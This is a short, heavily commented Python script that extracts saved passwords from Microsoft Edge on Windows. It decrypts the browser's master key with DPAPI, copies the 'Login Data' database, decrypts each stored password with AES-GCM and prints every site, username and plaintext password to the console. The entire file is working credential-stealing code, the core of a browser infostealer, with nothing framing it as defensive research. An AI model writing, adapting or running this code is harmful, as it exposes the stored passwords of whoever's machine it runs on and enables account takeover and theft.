import os # to make actions on system
import json # to convert json to dict
import base64 # to decode the base64 value
import win32crypt # to dercrypt DPAPI (windows data protector api)
import sqlite3 # to read data base files
import shutil # to copy the file
from Crypto.Cipher import AES # to decrypt the AES encryption


#get master key to decrypt the aes (256) crypt
def get_master_key():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'],r"Microsoft\Edge\User Data\Local State") # LOCALAPPDATA system var is the dir path of local app data local state is the file that stored the encryptd master key

    #convert the json file to dict data in python
    with open(local_state_path) as f:
        data = json.load(f) # convert it to dict value

    #get the part we need in the json file (encrypted_key)
    encrypted_key = data["os_crypt"]["encrypted_key"] # the encrypted_key be here
    encrypted_key = base64.b64decode(encrypted_key) # decode it from base64
    pure_encrypted_key = encrypted_key[5:] # start after letter num 5 and contine the end  (we remove DPAPI word from key)
    
    #decrypt the windows data protector api crypt using win32crypt
    master_key = win32crypt.CryptUnprotectData(pure_encrypted_key,dwFlags = 1)[1]# we go to index 1 in the tuple because it has the master_key data index 0 has the status
    
    #return master_key
    return master_key

#the function nof decrypt password
def decrypt_password(encrypted_password,master_key):
    try:
        iv = encrypted_password[3:15] #the iv its look like a uniqe finger point of this crypt as if the same name it wont creat a repeated crypt it will alaways be uniqe beacuse this num 
        cipher_text = encrypted_password[15:-16] # the encrypted password data be here
        cipher = AES.new(master_key,AES.MODE_GCM ,nonce=iv) # giving it the parmates it need
        palin_text = cipher.decrypt(cipher_text).decode("utf-8") # decode the bytes into readable text
    
        #return text read able to us
        return palin_text
    except:
        return "[please check your parmaters decrypt failure]"

#if the program running from itself
if __name__ == "__main__":
    master_key = get_master_key()
    login_db = os.path.join(os.environ['LOCALAPPDATA'],r"Microsoft\Edge\User Data\Default\Login Data")
    shutil.copy2(login_db,"tempdata.db") #copy the file to a temp file because if the main file are using we cant do any action in it 
    connector = sqlite3.connect("tempdata.db") # read the data base file
    curs = connector.cursor() # control the data base fle
    curs.execute("SELECT action_url, username_value, password_value FROM logins") # select the parts we need 

    #extract parts from every tuple 
    for data in curs.fetchall():
        url = data[0] 
        user_name = data[1]
        encrypted_password = data[2]

        decrypted_password = decrypt_password(encrypted_password,master_key) # decrypt the password

        if user_name and decrypted_password:
            print(f"{url} : {user_name} : {decrypted_password}\n{"="*20}\n")
        
    curs.close()
    connector.close()
    os.remove("tempdata.db")